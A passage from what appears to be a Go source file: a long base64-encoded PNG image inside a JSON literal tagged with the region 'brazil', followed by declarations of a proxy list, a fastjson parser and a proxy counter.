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","region":"brazil"}`)
	proxies      []string
	parser       fastjson.Parser
	TotalProxies int
)
